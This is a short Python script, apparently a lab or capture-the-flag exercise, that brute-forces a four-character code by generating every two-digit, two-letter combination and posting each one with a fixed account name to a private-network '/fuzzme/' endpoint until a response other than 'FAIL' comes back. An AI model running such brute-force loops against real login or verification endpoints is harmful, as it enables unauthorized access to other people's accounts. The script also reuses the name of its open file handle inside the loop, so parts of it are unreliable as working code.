# jgj891
# 54pf
import requests
from time import sleep
import itertools


def generate_strings():
    strings_list = []
    for combo in itertools.product("0123456789", repeat=2):
        for combo_alpha in itertools.product("abcdefghijklmnopqrstuvwxyz", repeat=2):
            generated_string = "".join(combo) + "".join(combo_alpha)
            strings_list.append(generated_string)
    return strings_list


def test_generate_strings():
    headers = {"Content-Type": "application/x-www-form-urlencoded"}

    with open("fuzzed.txt", "r") as f:
        count = 0
        tested = []
        for line in f:
            tested.append(line.strip())
            count += 1
            if count % 100 == 0:
                with open("tested.txt", "a") as f:
                    f.write("\n".join(tested))
                tested = []
            payload = {"abc123": "jgj891", "challenge": line.strip()}
            try:
                result = requests.post(
                    "http://10.100.118.111:8000/fuzzme/", headers=headers, data=payload
                )
            except requests.exceptions.RequestException as e:
                print(f"Error: {e}")
                break
            if result.text != "FAIL":
                print(f"Found the string: {line.strip()}")
                break
            sleep(0.01)


if __name__ == "__main__":
    result = generate_strings()
    with open("fuzzed.txt", "w") as f:
        f.write("\n".join(result))
    test_generate_strings()
